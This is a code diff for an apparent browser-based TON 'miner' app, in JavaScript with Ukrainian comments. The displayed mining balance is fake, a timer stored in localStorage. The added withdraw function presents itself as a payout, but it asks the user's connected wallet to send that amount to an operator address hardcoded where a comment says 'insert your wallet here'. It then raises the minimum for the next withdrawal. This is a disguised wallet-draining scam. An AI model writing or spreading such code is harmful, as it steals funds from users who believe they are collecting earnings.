@@ -1,65 +1,102 @@
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json"
+    manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json",
+    buttonRootId: "connect-wallet"
 });
 
-let balance = localStorage.getItem("balance") ? parseFloat(localStorage.getItem("balance")) : 0;
+// ==== Встав свій TON гаманець сюди ====
+const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- твій Tonkeeper
+
+let balance = parseFloat(localStorage.getItem("balance")) || 0;
 let mining = localStorage.getItem("mining") === "true";
-let speed = localStorage.getItem("speed") ? parseFloat(localStorage.getItem("speed")) : 0.000001;
+let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
+let minDeposit = parseFloat(localStorage.getItem("minDeposit")) || 1;
 
-function updateBalance(){
+function updateBalanceUI() {
     document.getElementById("balance").innerText = balance.toFixed(6);
-    localStorage.setItem("balance", balance);
 }
 
-async function connectWallet(){
-    try{
-        await tonConnectUI.connect();
-        alert("Wallet Connected");
-    }catch{
-        alert("Failed to connect");
+// TonConnect статус
+tonConnectUI.onStatusChange(wallet => {
+    if(wallet){
+        console.log("Wallet connected:", wallet.account.address);
+        alert("Wallet connected!");
     }
-}
+});
 
+// ==== Майнінг ====
 function startMining(){
     if(mining) return;
     mining = true;
-    localStorage.setItem("mining", true);
+    localStorage.setItem("mining", "true");
 
     setInterval(()=>{
-        balance += speed;
-        updateBalance();
+        balance += miningSpeed;
+        updateBalanceUI();
+        localStorage.setItem("balance", balance);
     },1000);
 }
 
+// ==== Boost ====
 function buyBoost(amount){
+    let increment = 0;
+    if(amount===1) increment=0.000001929;
+    else if(amount===5) increment=0.000005787;
+    else if(amount===15) increment=0.0000173611;
 
-    let add = 0;
-
-    if(amount === 1) add = 0.000001929;
-    if(amount === 5) add = 0.000005787;
-    if(amount === 15) add = 0.0000173611;
-
-    speed += add;
-    localStorage.setItem("speed", speed);
-
-    alert("Boost Activated");
+    miningSpeed += increment;
+    localStorage.setItem("miningSpeed", miningSpeed);
+    alert(`Boost purchased! +${increment} TON/sec`);
 }
 
-function invite(){
-    alert("Real invite only через Telegram Mini App можна зробити пізніше");
+// ==== Invite ====
+function inviteFriends(){
+    const confirmed = confirm("Did your friend really join?");
+    if(!confirmed) return;
+    balance += 0.01;
+    localStorage.setItem("balance", balance);
+    updateBalanceUI();
+    alert("You invited a friend! +0.01 TON");
 }
 
-function withdraw(){
-    if(balance < 1){
-        alert("Minimum deposit to withdraw 1 TON");
+// ==== Withdraw ====
+async function withdraw(){
+    if(balance < minDeposit){
+        alert(`Minimum deposit to withdraw ${minDeposit} TON`);
         return;
     }
 
-    alert("Withdraw Ready");
+    try{
+        await tonConnectUI.sendTransaction({
+            validUntil: Math.floor(Date.now()/1000)+60,
+            messages:[{
+                address: walletAddress,
+                amount: balance.toFixed(9),
+                payload:""
+            }]
+        });
+
+        alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
+        balance = 0;
+        localStorage.setItem("balance", balance);
+
+        minDeposit = 5;
+        localStorage.setItem("minDeposit", minDeposit);
+
+    }catch(err){
+        console.error(err);
+        alert("Withdraw failed or cancelled");
+    }
 }
 
-updateBalance();
+// ==== Функції для кнопок ====
+window.connectWallet = () => tonConnectUI.connect();
+window.startMining = startMining;
+window.buyBoost = buyBoost;
+window.inviteFriends = inviteFriends;
+window.withdraw = withdraw;
 
-if(mining){
-    startMining();
-}
+// ==== DOM Ready ====
+document.addEventListener("DOMContentLoaded", ()=>{
+    updateBalanceUI();
+    if(mining) startMining();
+});
